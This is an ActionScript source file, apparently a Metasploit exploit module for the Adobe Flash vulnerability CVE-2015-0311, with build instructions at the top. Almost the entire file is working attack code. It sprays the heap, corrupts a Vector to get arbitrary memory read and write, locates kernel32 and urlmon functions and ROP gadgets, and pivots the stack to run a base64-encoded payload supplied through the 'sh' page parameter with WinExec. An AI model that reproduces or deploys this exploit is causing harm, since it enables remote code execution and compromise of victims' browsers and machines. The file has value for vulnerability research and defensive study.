// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Be support to support 16.0 as target-player (flex-config.xml).
// 3. Download the Flex SDK (4.6)
// 4. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 5. Build with: mxmlc -o msf.swf Main.as

// Original code by @hdarwin89 // http://blog.hacklab.kr/flash-cve-2015-0311-%EB%B6%84%EC%84%9D/
// Modified to be used from msf
package
{
	import flash.display.Sprite;
	import flash.display.LoaderInfo;
	import flash.system.ApplicationDomain;
	import flash.utils.ByteArray;
	import avm2.intrinsics.memory.casi32;
	import flash.external.ExternalInterface;
	import mx.utils.Base64Decoder;

	public class Main extends Sprite 
	{
		private var data:uint = 0xdeaddead
		private var uv:Vector.<Object> = new Vector.<Object>
		private var ba:ByteArray = new ByteArray()
		private var spray:Vector.<Object> = new Vector.<Object>(51200)
		private var b64:Base64Decoder = new Base64Decoder();
		private var payload:String = "";
		
		/*public static function log(msg:String):void{
			var str:String = "";
			str += msg;
			
			trace(str);
			
			if(ExternalInterface.available){
				ExternalInterface.call("alert", str);
			}
		}*/

		public function Main() 
		{
			b64.decode(LoaderInfo(this.root.loaderInfo).parameters.sh)
			payload = b64.toByteArray().toString();
			
			for (var i:uint = 0; i < 1000; i++) ba.writeUnsignedInt(data++)
			ba.compress()
			ApplicationDomain.currentDomain.domainMemory = ba
			ba.position = 0x200
			for (i = 0; i < ba.length - ba.position; i++) ba.writeByte(00)
			try {
				ba.uncompress()
			} catch (e:Error) { }
			uv[0] = new Vector.<uint>(0x3E0)
			casi32(0, 0x3e0, 0xffffffff)
			
			for (i = 0; i < spray.length; i++) {
				spray[i] = new Vector.<Object>(1014)
				spray[i][0] = ba
				spray[i][1] = this
			}
			
			/*
			0:008> dd 5ca4000
			05ca4000  ffffffff 05042000 05ca4000 00000000
			05ca4010  00000000 00000000 00000000 00000000
			05ca4020  00000000 00000000 00000000 00000000
			05ca4030  00000000 00000000 00000000 00000000
			05ca4040  00000000 00000000 00000000 00000000
			05ca4050  00000000 00000000 00000000 00000000
			05ca4060  00000000 00000000 00000000 00000000
			05ca4070  00000000 00000000 00000000 00000000
			 */
			uv[0][0] = uv[0][0x2000003] - 0x18 - 0x2000000 * 4
			//log("uv[0][0]: " + uv[0][0].toString(16));
			
			ba.endian = "littleEndian"
			ba.length = 0x500000
			var buffer:uint = vector_read(vector_read(uv[0][0x2000008] - 1 + 0x40) + 8) + 0x100000
			//log("buffer: " + buffer.toString(16));
			
			var main:uint = uv[0][0x2000009] - 1
			//log("main: " + main.toString(16));
			
			var vtable:uint = vector_read(main)
			//log("vtable: " + vtable.toString(16));
			
			vector_write(vector_read(uv[0][0x2000008] - 1 + 0x40) + 8)
			vector_write(vector_read(uv[0][0x2000008] - 1 + 0x40) + 16, 0xffffffff)
			byte_write(uv[0][0])
			
			var flash:uint = base(vtable)
			//log("flash: " + flash.toString(16));
			
			// Because of the sandbox, when you try to solve kernel32 
			// from the flash imports on IE, it will solve ieshims.dll
			var ieshims:uint = module("kernel32.dll", flash) 
			//log("ieshims: " + ieshims.toString(16));
			
			var kernel32:uint = module("kernel32.dll", ieshims)
			//log("kernel32: " + kernel32.toString(16));
			
			var ntdll:uint = module("ntdll.dll", kernel32)
			//log("ntdll: " + ntdll.toString(16));
			
			var urlmon:uint = module("urlmon.dll", flash)
			//log("urlmon: " + urlmon.toString(16));
			
			var virtualprotect:uint = procedure("VirtualProtect", kernel32)
			//log("virtualprotect: " + virtualprotect.toString(16));
			
			var winexec:uint = procedure("WinExec", kernel32)
			//log("winexec: " + winexec.toString(16));
			
			var urldownloadtofile:uint = procedure("URLDownloadToFileA", urlmon);
			//log("urldownloadtofile: " + urldownloadtofile.toString(16));
			
			var getenvironmentvariable:uint = procedure("GetEnvironmentVariableA", kernel32)
			//log("getenvironmentvariable: " + getenvironmentvariable.toString(16));
			
			var setcurrentdirectory:uint = procedure("SetCurrentDirectoryA", kernel32)
			//log("setcurrentdirectory: " + setcurrentdirectory.toString(16));
			
			var xchgeaxespret:uint = gadget("c394", 0x0000ffff, flash)
			//log("xchgeaxespret: " + xchgeaxespret.toString(16));
			
			var xchgeaxesiret:uint = gadget("c396", 0x0000ffff, flash)
			//log("xchgeaxesiret: " + xchgeaxesiret.toString(16));
			
			// CoE
			byte_write(buffer + 0x30000, "\xb8", false); byte_write(0, vtable, false) // mov eax, vtable
			byte_write(0, "\xbb", false); byte_write(0, main, false) // mov ebx, main
			byte_write(0, "\x89\x03", false) // mov [ebx], eax
			byte_write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret


			byte_write(buffer+0x200, payload);
			byte_write(buffer + 0x20070, xchgeaxespret)
			byte_write(buffer + 0x20000, xchgeaxesiret)
			byte_write(0, virtualprotect)

			// VirtualProtect
			byte_write(0, winexec)
			byte_write(0, buffer + 0x30000)
			byte_write(0, 0x1000)
			byte_write(0, 0x40)
			byte_write(0, buffer + 0x100)

			// WinExec
			byte_write(0, buffer + 0x30000)
			byte_write(0, buffer + 0x200)
			byte_write(0)

			byte_write(main, buffer + 0x20000)
			toString()
		}
		
		private function vector_write(addr:uint, value:uint = 0):void
		{
			addr > uv[0][0] ? uv[0][(addr - uv[0][0]) / 4 - 2] = value : uv[0][0xffffffff - (uv[0][0] - addr) / 4 - 1] = value
		}

		private function vector_read(addr:uint):uint
		{
			return addr > uv[0][0] ? uv[0][(addr - uv[0][0]) / 4 - 2] : uv[0][0xffffffff - (uv[0][0] - addr) / 4 - 1]
		}

		private function byte_write(addr:uint, value:* = 0, zero:Boolean = true):void
		{
			if (addr) ba.position = addr
			if (value is String) {
				for (var i:uint; i < value.length; i++) ba.writeByte(value.charCodeAt(i))
				if (zero) ba.writeByte(0)
			} else ba.writeUnsignedInt(value)
		}

		private function byte_read(addr:uint, type:String = "dword"):uint
		{
			ba.position = addr
			switch(type) {
				case "dword":
					return ba.readUnsignedInt()
				case "word":
					return ba.readUnsignedShort()
				case "byte":
					return ba.readUnsignedByte()
			}
			return 0
		}

		private function base(addr:uint):uint
		{
			addr &= 0xffff0000
			while (true) {
				if (byte_read(addr) == 0x00905a4d) return addr
				addr -= 0x10000
			}
			return 0
		}

		private function module(name:String, addr:uint):uint
		{
			var iat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x80) 
			var i:int = -1
			while (true) {
				var entry:uint = byte_read(iat + (++i) * 0x14 + 12)
				if (!entry) throw new Error("FAIL!");
				ba.position = addr + entry
				var dll_name:String = ba.readUTFBytes(name.length).toUpperCase();
				if (dll_name == name.toUpperCase()) {
					break;
				}
			}
			return base(byte_read(addr + byte_read(iat + i * 0x14 + 16)));
		}

		private function procedure(name:String, addr:uint):uint
		{
			var eat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x78)
			var numberOfNames:uint = byte_read(eat + 0x18)
			var addressOfFunctions:uint = addr + byte_read(eat + 0x1c)
			var addressOfNames:uint = addr + byte_read(eat + 0x20)
			var addressOfNameOrdinals:uint = addr + byte_read(eat + 0x24)
			
			for (var i:uint = 0; ; i++) {
				var entry:uint = byte_read(addressOfNames + i * 4)
				ba.position = addr + entry
				if (ba.readUTFBytes(name.length+2).toUpperCase() == name.toUpperCase()) break
			}
			return addr + byte_read(addressOfFunctions + byte_read(addressOfNameOrdinals + i * 2, "word") * 4)
		}

		private function gadget(gadget:String, hint:uint, addr:uint):uint
		{
			var find:uint = 0
			var limit:uint = byte_read(addr + byte_read(addr + 0x3c) + 0x50)
			var value:uint = parseInt(gadget, 16)
			for (var i:uint = 0; i < limit - 4; i++) if (value == (byte_read(addr + i) & hint)) break
			return addr + i
		}
	}
}